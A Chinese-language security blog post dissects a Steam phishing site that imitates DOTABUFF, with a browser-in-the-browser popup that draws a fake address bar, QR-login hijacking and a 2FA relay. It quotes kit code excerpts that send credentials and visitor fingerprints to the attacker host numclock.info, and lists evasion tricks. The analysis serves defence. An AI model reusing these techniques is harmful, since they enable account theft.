---
title: "dota2buff.org 盗号链路拆解"
description: "拆解一个冒充 DOTABUFF 的 Steam 盗号钓鱼站：它如何用 window.open 开真窗口、再画一个假浏览器外框和假地址栏，把'看地址栏'这条防线整体架空。"
pubDatetime: 2026-10-07T20:00:00+08:00
draft: false
tags:
  - 网络安全
  - 钓鱼
  - Steam
  - Dota2
  - 取证分析
---


> 整理：2026-09-17
> 对象：`https://dota2buff.org/`（疑似冒充 `www.dotabuff.com`）
> 方法：静态抓取首页 HTML + 其引用的 3 个 JS/HTML 资源，逐层还原登录流程与数据流向
> **本文只做防御性分析与取证，不含可复现的攻击实现。所有代码片段均为原文件截取，用于核验。**

---

## 0. 结论速览

| 问题 | 结论 |
|---|---|
| 它是怎么骗到人的 | 两层错觉。外层 `dota2buff.org` 冒充 `dotabuff.com`（第三方统计站，本身就该跳 Steam 登录）；内层弹窗用 `window.open` 开**真窗口**，再往里写一个**假浏览器外框**，假地址栏显示真 `steamcommunity.com` 链接 |
| 弹窗是真窗口吗 | **是**。所以"拖出主窗口边界"这个惯用测试**测不出来** |
| 那串 Steam 链接是真的吗 | 是**真的** Steam OpenID 地址，但被填在 `<input>` 里当图片看。真实的 `return_to` / `realm` 指向运行时随机生成的域名 |
| 真正偷走账号的是什么 | 三段式：① 假登录表单收 密码 + 令牌码/邮箱码/短信码；② **Steam 二维码登录劫持**（免密码、免 2FA）；③ 2FA 实时代填 |
| 后端在哪 | **不是** `dota2buff.org`，是 `numclock.info` |
| 一句话 | **"看地址栏"这条防线被彻底架空——因为你看到的地址栏是画出来的。** |

---

## 1. 站点身份：克隆站 + 诱饵弹窗

抓取 `https://dota2buff.org/` 首页（HTTP 200，168,944 字节，Server: cloudflare），确认是**整站克隆**：

| 证据 | 内容 |
|---|---|
| 页面标题 | `<title>DOTABUFF.com - Official Website :: Dota 2 Statistics and Analytics</title>` |
| 正文链接 | 多处指向 `https://ru.dotabuff.com/signin`（**真站**） |
| 栏目 | "Preview EWC Playoffs"、"What is broken in the current patch?" 等文章，作者 `KawaiiSocks` |

即：正文是抓 `dotabuff.com` 抓下来的静态副本，**连"Sign in through Steam"的超链接都还指着真站**。

### 1.1 整站被改造成"点哪儿都弹框"

首页尾部内联脚本做了两件事：

```js
// 1) 把所有链接打死
if (item.tagName === 'A') {
  item.setAttribute('href', '#!');
  item.setAttribute('target', '_self');
}
// 2) 除登录按钮和关闭按钮外，全部改绑到弹框
if (!item.classList.contains('action-login-steam')) {
  if (!item.classList.contains('modal-close')) {
    item.addEventListener('click', e => { e.preventDefault(); openModal(); });
  }
} else {
  item.classList.add('r76a3l3tgl8n');   // ← 真登录按钮，交给外部 JS 接管
}
```

⇒ **用户点页面任意位置（正文、图片、菜单），弹出的都是同一个 "Authorization" 框。** 这一步保证诱饵一定会被触发。

弹框内容（原文）：

```html
<h2 class="modal-title">Authorization</h2>
<p class="modal-text">Log in to your account to access all the features of the platform.
Get skins, participate in sweepstakes and get exclusive offers!</p>
<button class="auth-button action-login-steam">Log in via Steam</button>
```

注意 logo 是 `<img src="/index_files/Screenshot_1.png">` —— **直接拿一张截图当 logo**，这是低劣克隆的典型痕迹。

---

## 2. 登录链路逐层拆解

### 第 1 层：外部脚本 `/knrytpm6uedu.js`（417,719 字节）

文件名是 12 位随机串。内容是 **React 打包产物 + 混淆过的攻击载荷**——混淆强度高到：整个文件里**只剩 7 个 URL**，其中 5 个是 W3C 命名空间。

唯一可疑的那一个：

```
https://steamcommunity.com/openid/login
  ?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0
  &openid.mode=checkid_setup
  &openid.return_to=https%3A%2F%2F   ← 后面是运行时拼的
  ...%2F&openid.realm=https%3A%2F%2F  ← 同样是拼的
  &openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1
  &openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select
  &openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select
```

**这是一条语法完全正确的 Steam OpenID 2.0 登录链接。** `identifier_select` 是标准写法（让用户在 Steam 侧选账号）。

### 第 2 层：这些字符串被塞进一个 `<input>`，充当"地址栏"

同一文件里，React 元素树这么建：

```js
const _0x3f0c65 = {
  authWindow, header, headerIcon, headerTitle, headerControl, headerBtn,
  hideBtn, toggleBtn, toggledBtn, closeBtn,
  url, ssl, urlInput, translateIcon,
  urlMozilla, inBlockMozilla, inBlockMozillaBtn, urlMozillaMenuBtn
};   // 每个键的值 = _0x4a325f(0x20) = 32 位随机小写字母

// ...
React.createElement('input', {
  type: 'text',
  value: 'steamcommunity.com/openid/login?openid.ns=...&openid.return_to=https%3A%2F%2F' + <运行时拼>
})
```

**这就是你看到的"弹窗内指向 Steam 官方链接"。** 它不是一个真实地址栏，是一个 `<input type="text">`，`value` 被写死成 Steam 的 OpenID 地址。

两个细节值得注意：

- 值以 `steamcommunity.com/...` 开头，**故意不带 `https://`** —— 因为现代 Chrome 本来就把 `https://` 折叠隐藏。伪造者连这个都对齐了。
- `_0x3f0c65` 里同时有 `ssl`（假小锁）、`url`、`urlInput`、`hideBtn`/`toggleBtn`/`closeBtn`（假窗口按钮）—— 这是一整套**画出来的浏览器外框**，不是疏忽。

### 第 3 层：`window.open` + 写入假外框 + iframe

关键配置对象（原文，去混淆后）：

```js
_0x3ef63f = {
  0: <随机类名>,
  1: window['$ls'] || 'rfnz0vqmx3h8.html',   // ★ 弹窗里要加载的页面
  2: 'numclock.info',                        // ★★ 真正的后端域名
  3: 'NEW_PAGE_ABOUT_BLANK'
};
```

分支逻辑：判断 `_0x3ef63f[3] === 'NEW_PAGE_ABOUT_BLANK'`，成立则：

```js
_0x3595fd = window.open(<about:blank>, <窗口名>, <窗口参数>);
_0x3595fd['document']['write']( ... + location['host'] + '/' + _0x3ef63f[1] + ... );
```

**这是整个骗局的技术核心。** 拆开说：

1. `window.open()` 开的是**操作系统层面真实的第二个窗口**——所以它能被拖到主窗口外面（拖拽测试失效）。
2. 因为开的是 `about:blank`，新窗口与打开者**同源**，于是可以用 `document.write` 往里面**整篇覆写任意 HTML**。
3. 写进去的内容 = 假浏览器外框（含那段假地址栏 `<input>`）+ 一个铺满窗口的 iframe：

```
" frameborder="0" width="100%" height="100%" style="position:absolute;"></iframe></body></html>
```

4. iframe 的 src = `location.host + '/' + 'rfnz0vqmx3h8.html'`，即 `https://dota2buff.org/rfnz0vqmx3h8.html`。

> **注意 `window['$ls']` 这个可覆盖点**：只要能往页面里注入 `window.$ls`，就能把弹窗内容换成任意页面。说明这是**按批次配置的成套钓鱼套件**，不是一次性手搓。

### 第 4 层：iframe 里的假登录页

`/rfnz0vqmx3h8.html`：52,162 字节，其中约 99% 是一个 base64 内嵌的 favicon；`<title></title>` **是空的**；不加载任何 CSS。它只引一个脚本：

```html
<script src="/sp385hg320on.js"></script>
```

`/sp385hg320on.js` 有 **1,178,299 字节**（React + axios 全量打包 + 页面逻辑）。它的 state 对象直接暴露了它想收什么：

```js
const _0x340754 = {
  networkError, changingLanguage, authType,
  accountName: '', password: '',
  secret: 0, ah: 0, ph: 0,
  twoFactorCode: '', authCode: '', smsCode: '',
  language: localStorage.getItem(...),
  lastNumberDigits: '',
  loading: false, mail: '',
  domainToLogin: ...
};
```

| 字段 | 对应真实 Steam 登录页的什么 |
|---|---|
| `accountName` / `password` | 账号 / 密码 |
| `twoFactorCode` | Steam 令牌（手机 App）动态码 |
| `authCode` | 邮箱验证码 |
| `smsCode` | 短信验证码 |
| `lastNumberDigits` | "发送到尾号 XXXX 的手机"——连这句都仿了 |
| `mail` | 邮箱 |
| `secret` / `secret2` / `ah` / `ph` | **不属于任何 Steam 流程**，是套件自用的跟踪/反自动化字段（语义为推断） |

配套 i18n 覆盖约 30 种语言，含简体中文与繁体中文（如 `'Steam 手机应用'`、`'创建帐户'`、`'正在加载帐号'`、`'请请求帮助，我无法登录。'`），页脚还抄了 Valve 的多语言版权声明。**这是商品化套件的标志。**

---

## 3. 数据回传：三段式，各偷各的

### ① 凭证提交（偷密码 + 各类验证码）

```js
const payload = {
  accountName, password, smsCode, twoFactorCode, authCode,
  referralLink: parent.location.pathname || '/',   // ← 读父窗口，追踪从哪个诱饵页进来
  domain: location.hostname,
  secret: <三段拼接>, secret2: <临时密钥>,
  ip: '', u: <cookie 'uv'>, ua: navigator.userAgent
};
```

一次把**密码和三种验证码全打包**。`referralLink` 取的是 `parent.location.pathname`——反过来印证了它确实是嵌在 iframe 里跑的，同时用于给不同推广渠道分成。

### ② Steam 二维码登录劫持（最危险，免密免 2FA）

```js
_0x1b7e58({ method: 'post', url: <运行时拼>,
  data: { QRChallengeURL: _0x4b9c7c, domain, referralLink, secret, secret2, u, ua, ip: '' } });
```

对应字符串表里真实存在的地址：

```
https://s.team/q/1/                               ← 前缀
https://s.team/q/1/14106879661619225162           ← 一个具体的 challenge
```

`s.team/q/1/<challenge>` 是 **Steam 官方二维码登录深链**。这条路线的危害远大于假表单：

- 受害者用 Steam 手机 App 扫这个码 → **App 会询问"是否确认登录"** → 受害者一按确认，就授权了**攻击者那一侧**的会话；
- 全程**不需要输入密码，也不需要任何验证码**——因为"扫码确认"本身就是 2FA；
- 受害者账号上的所有 2FA 设置**全部失效**。

### ③ 2FA 实时代填

```js
_0x1b7e58({ method: 'post', url: <运行时拼>,
  data: { id: _0x22c681, steamGuardCode: _0x13a7eb, referralLink, domain, u, ua, ip: '' } });
```

带 `id` + `steamGuardCode`。这是典型的**反向中继**：攻击者后端此刻正在用受害者刚交的密码登录 Steam（可能被 Steam Guard 拦下），于是把"请输入令牌码"这个需求下发给假页面，受害者一填，验证码实时转发过去，攻击者在 60 秒有效期内完成登录。

### 后端与指纹

- 后端域名：**`numclock.info`**（明文硬编码在主页 JS 里）
- 上报路径是**随机填充的**：`'//' + 'numclock.info' + '/d' + <8随机字母> + 'o' + <8随机> + 'm' + ... + 'n'`

  ⇒ 语义是 `/domain`，但字母之间插随机串，服务端按 `d.*o.*m.*a.*i.*n` 这类骨架正则匹配。**精确路径黑名单直接失效。**
- 首屏还有一个 XHR 探针：

  ```js
  new XMLHttpRequest().open(<POST>, '//numclock.info/d<rand>o<rand>m<rand>a<rand>i<rand>n', true);
  // body: 'd=' + location<...> + <cookie 'uv'> + encodeURIComponent(navigator.userAgent)
  ```

  即：**页面一加载就把访客指纹和来源上报了**，不需要等用户点任何东西。
- 出现 `XSRF-TOKEN` / `X-XSRF-TOKEN` 与 axios ⇒ 后端多半是 **Laravel 风格的面板**（这类"钓鱼面板"在灰产里是成品软件）。

---

## 4. 它到底绕过了什么

你问的"如何绕过『仿冒近似官网域名』这一常规手法"——答案是：**它根本不在域名层面竞争了。**

常规钓鱼：伪造 `steamcommun1ty.com` 之类仿冒域名 → 防线是"看地址栏域名对不对"。
这套的做法是把这个防线**整体架空**：

| # | 手法 | 绕过了什么 |
|---|---|---|
| 1 | 假地址栏是个 `<input type="text">`，`value` 是真的 `steamcommunity.com/openid/login?...` | 绕过了"看地址栏"——**地址栏是画出来的，可以写任何内容** |
| 2 | 弹窗是 `window.open` 开的**真窗口**，再 `document.write` 覆写内容 | 绕过了"把弹窗拖出主窗口看是否被裁切"这个惯用测试 |
| 3 | 诱饵域名只需像 `dotabuff.com`，**不需要像 Steam** | 绕过了"Steam 域名相似度"检查；dotabuff 本身就是跳 Steam 登录的第三方站，跳转合理 |
| 4 | 攻击者的真域名 `numclock.info` **从不出现在地址栏**，且路径被随机字母打散 | 绕过了 URL/路径黑名单 |
| 5 | `_0x4a325f(n)` 用 `Math.random()` 现场生成 n 位随机串：18 个 CSS 类名各 32 位随机、`openid.return_to` 的主机名也是随机拼的 | 绕过了基于 CSS 选择器 / 固定字符串的静态检测——**每次加载类名都不一样** |
| 6 | 主页 HTML 里 `openid`、`steamcommunity` 命中数均为 **0**；JS 里对 `dota2buff` 的命中也是 **0** | 绕过了爬虫/关键词扫描 |
| 7 | 资源文件名全为 12 位随机串（`knrytpm6uedu.js` / `rfnz0vqmx3h8.html` / `sp385hg320on.js`） | 绕过了文件级黑名单 |

补充一个技术上的准确说法——**关于 OpenID 的"授权范围滥用"，要说清楚边界**：

- Steam OpenID 走完流程，只会把 **SteamID64**（一串公开可见的账号 ID）交给回调方。**拿不到密码，也不足以接管账号。**
- 所以"弹窗指向真 Steam 链接"这件事本身**不足以致害**；它在这里主要起**装饰和取信作用**——让那个地址栏看起来无懈可击。
- 真正致命的是 iframe 里那份**假的登录表单**，以及二维码与 2FA 中继。**"地址栏是官方的"≠"输入框是官方的"**，这是整件事最需要记住的一点。

---

## 5. 反侦察手法清单（证据汇总）

| 手法 | 证据 |
|---|---|
| 字符串数组混淆 | 变量名 `_0x4a325f` / `_0x26ae41` / `_0x568e47` / `_0x3ef63f`，字符串全部索引化 |
| 类名运行时随机 | `_0x4a325f(n)` = `n` 位 `Math.random()` 小写字母；`_0x3f0c65` 18 个键全部指向它 |
| 资源名随机 | 3 个主资源均为 12 位随机名，且相互引用（改了名仍自动链上） |
| 图床/资源内联 | favicon、浏览器外框图、Steam 图标全转 base64 内嵌，**无外部图片请求** |
| 路径骨架正则化 | `/d*o*m*a*i*n`、`/c*h*e*c*k*e*r` 形式的随机填充路径 |
| 反自动化字段 | 载荷含 `ah`、`ph`、`secret`、`secret2` 等非 Steam 字段（语义推断，未证实） |
| CDN 遮蔽 | 前置 Cloudflare，源站 IP 不直接暴露 |
| 套件化 | ~30 语言 i18n、多语言 Valve 版权文本、Laravel 风格面板 |

---

## 6. 防御清单

### 6.1 个人层面（最有用）

1. **登录任何第三方站，永远从"我自己打开"开始。** 别从别人发的链接、搜索结果广告、群消息点进去。
2. **地址栏只信浏览器自己画的那个。** 页面里画出来的地址栏、页面里画出来带小锁的框，**一律不作数**。
3. **登录页出现在 iframe 里 = 假的。** 真实 `steamcommunity.com` 发了 `X-Frame-Options`，**不可能被别的站套进框里**。看到"页面中间一个小窗口里是 Steam 登录"就已经可以关掉了。
4. **扫码前先看是谁在问。** Steam 手机 App 弹"是否确认登录"时，那是别人发起的登录请求——你按确认就是把账号交给发起方。**不认识的登录一律点拒绝。**
5. **已经输入过怎么办**（按顺序做）：
   - 改 Steam 密码；
   - `设置 → 安全` 里**注销所有其他设备**；
   - 检查 API 密钥：`https://steamcommunity.com/dev/apikey`，**看到不认识的就撤销**（这是"报价被掉包"类盗号的常见准备动作）；
   - 检查并撤销不认识的**已授权设备**；
   - 检查交易报价历史与库存。
6. **别复用密码**：这里是 Steam 账号，但同一个密码大概率还挂在别的站上。

### 6.2 可落地的检测信号（给做脚本/规则的人）

| 信号 | 说明 |
|---|---|
| 登录表单处于 `window.top !== window.self` | 真 Steam 登录页永远不会被套框 |
| 地址栏是 DOM 元素 | 检测"看起来像地址栏的 `input`"本身就是强特征 |
| `window.open` 后紧接 `document.write` | **真弹窗 + 写内容**的组合几乎只见于 Browser-in-the-Browser（BitB，浏览器套浏览器）类攻击 |
| 页面里的 `<a>` 被批量改写为 `#!` 且点击统一弹框 | 克隆站伪装特征 |
| 母域名为 12 位随机串、无 CSS 外链、`<title>` 为空 | 一次性钓鱼壳页特征 |
| 表单同时收集 `password` + `twoFactorCode` + `authCode` + `smsCode` | 真 Steam 分步走，**不会在同一个表单里一次要三种码** |

### 6.3 举报

域名注册商 Abuse 通道（whois 查 Registrar）+ Cloudflare Abuse（前置 CDN）+ Steam 支持。`numclock.info` 同样值得一并提交。

---

## 7. 未核实 / 存疑项

1. **`_0x26ae41(0x249)`、`_0x26ae41(0x17b)` 的具体字符串未解析**（需要实现该混淆器的字符串数组还原 + 偏移）。已确认：`openid.return_to` / `realm` 的主机名是**运行时用随机字母拼出来的**，不是固定域名；但没还原出完整成品串。
2. **`ah` / `ph` / `secret` / `secret2` 的确切语义未证实**，只确认它们不属于 Steam 任何流程。
3. **`s.team/q/1/14106879661619225162` 是一个写死在字符串表里的 challenge**，不可能长期有效。真实攻击中二维码应由后端动态下发（`QRChallengeURL` 字段就是干这个的），但**动态流程我没实测**。
4. **未验证实际网络行为**：以上全部基于静态文件分析，我没有点击登录、没有提交任何表单、没有与 `numclock.info` 建立业务交互。首页那个 XHR 探针是分析文件时看到的，**没有主动触发**。

---

## 8. 一句话总结

**它赢在把"地址栏"从浏览器手里搬到了自己手里。** 域名像不像不重要了——重要的是你抬头看到的那一行字，是 HTML 画出来的。
